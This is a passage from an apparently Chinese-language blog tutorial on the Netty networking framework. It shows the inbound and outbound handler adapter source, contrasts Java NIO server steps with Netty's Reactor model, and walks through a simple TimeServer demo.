behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelActive</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelActive();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelInactive()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelInactive</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelInactive();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelRead(Object)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelRead(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelReadComplete()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelReadComplete</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelReadComplete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireUserEventTriggered(Object)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">userEventTriggered</span><span class="params">(ChannelHandlerContext ctx, Object evt)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireUserEventTriggered(evt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelWritabilityChanged()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelWritabilityChanged</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelWritabilityChanged();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireExceptionCaught(Throwable)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;deprecation&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exceptionCaught</span><span class="params">(ChannelHandlerContext ctx, Throwable cause)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireExceptionCaught(cause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>outbound事件：<code>ChannelOutboundHandlerAdapter</code>，一样的，重写感兴趣的就行了。事件同样和前面列出的相同。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChannelOutboundHandlerAdapter</span> <span class="keyword">extends</span> <span class="title class_">ChannelHandlerAdapter</span> <span class="keyword">implements</span> <span class="title class_">ChannelOutboundHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#bind(SocketAddress, ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(ChannelHandlerContext ctx, SocketAddress localAddress,</span></span><br><span class="line"><span class="params">            ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.bind(localAddress, promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#connect(SocketAddress, SocketAddress, ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(ChannelHandlerContext ctx, SocketAddress remoteAddress,</span></span><br><span class="line"><span class="params">            SocketAddress localAddress, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.connect(remoteAddress, localAddress, promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#disconnect(ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">disconnect</span><span class="params">(ChannelHandlerContext ctx, ChannelPromise promise)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.disconnect(promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#close(ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(ChannelHandlerContext ctx, ChannelPromise promise)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.close(promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#deregister(ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deregister</span><span class="params">(ChannelHandlerContext ctx, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.deregister(promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#read()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">read</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.read();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#write(Object, ChannelPromise)&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(ChannelHandlerContext ctx, Object msg, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.write(msg, promise);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#flush()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelOutboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一个简单的netty-demo">一个简单的Netty Demo</h2><p>Maven依赖如下，官网上说版本5已经弃用了，我这里用的最新的Netty4.1.28。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.netty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>netty-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.86.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们用Netty框架实现一个服务端的demo。首先我们回想一下，如果你用java的NIO类库，大概流程是啥？</p><ul><li><p>服务端</p><ol type="1"><li>创建<code>ServerSocketChannel</code>，绑定地址</li><li>设置为非阻塞模式，开始监听</li><li>创建监听器<code>Selector</code>，注册<code>ServerSocketChannel</code>到该<code>Selector</code>，并注册感兴趣的<code>SelectionKey</code>为<code>SelectionKey.OP_ACCEPT</code>。</li><li>执行<code>select()</code>，轮询就绪的<code>SocketChannel</code></li></ol><ul><li>若有<code>SocketChannel</code>可用（其状态为<code>OP_ACCEPT</code>），则调用<code>accept()</code>方法接受客户端<ol type="1"><li>设置新接入的客户端的<code>SocketChannel</code>为非阻塞模式</li><li>将其注册到<code>Selector</code>，感兴趣的<code>Selectionkey</code>为<code>SelectionKey.OP_READ</code>。</li></ol></li><li>若有<code>SocketChannel</code>可用（其状态为<code>OP_READ</code>），则构造<code>ByteBuffer</code>读取数据包。</li><li>若有<code>SocketChannel</code>可用（其状态为<code>OP_WRITE</code>），说明数据包没发完，得继续发送。</li></ul></li></ul><p>是不是有点小复杂，在Netty框架下，上面的事情会简单一些：</p><ul><li>服务端<ol type="1"><li>根据Reactor模式（这里是<strong>多actor多线程模型</strong>），创建两个<code>NioEventLoopGroup</code>分别处理监听和业务。</li><li>创建<code>ServerBootstrap</code>以快速配置，包括使用的线程组（监听and 业务）、TCP相关（最大连接数等）、业务Handler。</li><li>绑定端口开始监听。</li><li>若有<code>SocketChannel</code>可用，自动按照我们编写的回调函数处理。此间，读取与写入均使用Netty提供的<code>ByteBuf</code>，相较于<code>ByteBuffer</code>更为方便。</li></ol></li></ul><p>ok结了，是不是相较于原生的用法简单太多了。具体C，S代码如下。</p><h3 id="服务端">服务端</h3><p>根据上面提到的流程，我们首先看一下大致流程：</p><figure><img src="/img/Netty框架学习/image-20230110000156864.png"alt="Netty服务创建流程图" /><figcaption aria-hidden="true">Netty服务创建流程图</figcaption></figure><p>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.bootstrap.ServerBootstrap;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.ByteBuf;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.Unpooled;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.NioServerSocketChannel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/09</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimeServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TimeServerHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="comment">// 准备接受数据的ByteBuf，该类是Netty对应ByteBuffer提供的</span></span><br><span class="line">            <span class="type">ByteBuf</span> <span class="variable">buf</span> <span class="operator">=</span> (ByteBuf) msg;</span><br><span class="line">            <span class="type">byte</span>[] request = <span class="keyword">new</span> <span class="title class_">byte</span>[buf.readableBytes()];</span><br><span class="line">            buf.readBytes(request);</span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(request, StandardCharsets.UTF_8).trim();</span><br><span class="line">            System.out.println(<span class="string">&quot;** 新的请求 ** : &quot;</span> + body);</span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;QUERY&quot;</span>.equalsIgnoreCase(body)</span><br><span class="line">                    ? <span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis()).toString()</span><br><span class="line">                    : <span class="string">&quot;Unknown Command&quot;</span>;</span><br><span class="line">            <span class="type">ByteBuf</span> <span class="variable">response</span> <span class="operator">=</span> Unpooled.copiedBuffer(result.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            ctx.write(response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ChildChannelHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt; &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel ch)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            ch.pipeline().addLast(<span class="keyword">new</span> <span class="title class_">TimeServerHandler</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Reactor模式</span></span><br><span class="line">        <span class="comment">// 配置服务端的NIO线程组（默认线程工厂和线程数量）</span></span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">upperGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServerBootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerBootstrap</span>();</span><br><span class="line">            <span class="comment">// 配置相关信息，Builder模式</span></span><br><span class="line">            <span class="comment">// 配置Reactor模式所属线程组</span></span><br><span class="line">            bootstrap.group(upperGroup, workerGroup)</span><br><span class="line">                    <span class="comment">// 配置channel类</span></span><br><span class="line">                    .channel(NioServerSocketChannel.class)</span><br><span class="line">                    <span class="comment">// 配置Channel可选项。此处为“可连接队列大小”</span></span><br><span class="line">                    .option(ChannelOption.SO_BACKLOG, <span class="number">1024</span>)</span><br><span class="line">                    .childHandler(<span class="keyword">new</span> <span class="title class_">ChildChannelHandler</span>());</span><br><span class="line">            <span class="comment">// 绑定端口，同步等待成功</span></span><br><span class="line">            <span class="type">ChannelFuture</span> <span class="variable">f</span> <span class="operator">=</span> bootstrap.bind(port).sync();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待服务监听端口关闭</span></span><br><span class="line">            f.channel().closeFuture().sync();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 退出，释放线程池资源</span></span><br><span class="line">            <span class="comment">// 区别于shutdownNow()，他还会有个平静期DEFAULT_SHUTDOWN_QUIET_PERIOD，此间若有任务提交他还是会继续工作</span></span><br><span class="line">            <span class="comment">// 可以这很优(nei)雅(juan)</span></span><br><span class="line">            upperGroup.shutdownGracefully();</span><br><span class="line">            workerGroup.shutdownGracefully();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">listenPort</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">TimeServer</span>().bind(listenPort);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里着重注意以下片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reactor模式</span></span><br><span class="line"><span class="comment">// 配置服务端的NIO线程组（默认线程工厂和线程数量）</span></span><br><span class="line"><span class="type">EventLoopGroup</span> <span class="variable">upperGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line"><span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line"><span class="type">ServerBootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerBootstrap</span>();</span><br><span class="line"><span class="comment">// 配置相关信息，Builder模式</span></span><br><span class="line"><span class="comment">// 配置Reactor模式所属线程组</span></span><br><span class="line">bootstrap.group(upperGroup, workerGroup)</span><br><span class="line">    <span class="comment">// 配置channel类</span></span><br><span class="line">    .channel(NioServerSocketChannel.class)</span><br><span class="line">    <span class="comment">// 配置Channel可选项。此处为“可连接队列大小”</span></span><br><span class="line">    .option(ChannelOption.SO_BACKLOG, <span class="number">1024</span>)</span><br><span class="line">    .childHandler(<span class="keyword">new</span> <span class="title class_">ChildChannelHandler</span>());</span><br></pre></td></tr></table></figure><p>回顾一下前面的Reactor模式，我们首先创建了两个默认的<code>NioEventLoopGroup</code>，并在构造<code>ServerBootstrap</code>时传入，代表我们使用是<strong>多actor多线程的模型</strong>。</p><p>当然如果是单actor多线程的模型，我们构造方式一样，区别代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reactor模式</span></span><br><span class="line"><span class="comment">// 配置服务端的NIO线程组（默认线程工厂和线程数量）</span></span><br><span 